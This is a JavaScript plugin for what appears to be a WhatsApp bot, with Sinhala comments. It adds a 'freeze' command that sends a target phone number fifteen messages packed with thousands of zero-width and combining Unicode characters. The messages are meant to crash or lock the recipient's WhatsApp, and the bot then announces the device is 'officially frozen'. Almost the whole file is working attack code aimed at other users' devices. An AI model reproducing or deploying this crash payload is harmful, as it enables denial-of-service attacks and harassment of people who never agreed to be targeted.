const { cmd } = require('../command');

cmd({
    pattern: "freeze",
    alias: ["lock", "dead"],
    desc: "Infinite WhatsApp Crash Loop (No Errors)",
    category: "owner",
    react: "🥶",
    filename: __filename
},
async (conn, mek, m, { from, isOwner, reply, args, senderNumber }) => {
    try {
        const authorizedNumbers = ['94740137623']; // ඔයාගේ අංකය මෙතනට දාන්න
        const isAuthorized = authorizedNumbers.includes(senderNumber) || isOwner;
        if (!isAuthorized) return;

        if (!args[0] && !m.quoted) return reply("අංකයක් දෙන්න!");

        let target = m.quoted ? m.quoted.sender : args[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";

        reply("🚀 Initiating Freeze Attack... Please wait.");

        // 1. මේ ලූප් එකෙන් මැසේජ් 15ක් විතර යවනවා
        // එක මැසේජ් එකක් ලොකු වෙනවා වෙනුවට, මැසේජ් කීපයක් එකතු වුණාම තමයි Crash එක වෙන්නේ
        for (let i = 0; i < 15; i++) {
            const crashPayload = "\u200b".repeat(4000) + "҉".repeat(400) + "\u0345\u0361\u0345".repeat(400);

            await conn.sendMessage(target, { 
                text: `*⚠️ HASHU-LAG SYSTEM OVERLOAD [${i+1}] ⚠️*\n` + crashPayload,
                contextInfo: {
                    forwardingScore: 999,
                    isForwarded: true,
                    externalAdReply: {
                        title: "W H A T S A P P  L O C K E D",
                        body: "Device Status: Unresponsive",
                        mediaType: 1,
                        renderLargerThumbnail: false, // Error එන එක නතර කරන්න මේක false කළා
                        thumbnailUrl: `https://files.catbox.moe/vbo0vq.png`, 
                        sourceUrl: "https://whatsapp.com"
                    }
                }
            });

            // තත්පර බාගයක පොඩි ඩිලේ එකක් දානවා සර්වර් එකට ලෝඩ් නොවී ඉන්න
            await new Promise(resolve => setTimeout(resolve, 500)); 
        }

        reply("✅ Target device is now officially frozen. 💀");

    } catch (e) {
        console.error("Freeze Logic Error:", e.message);
    }
});
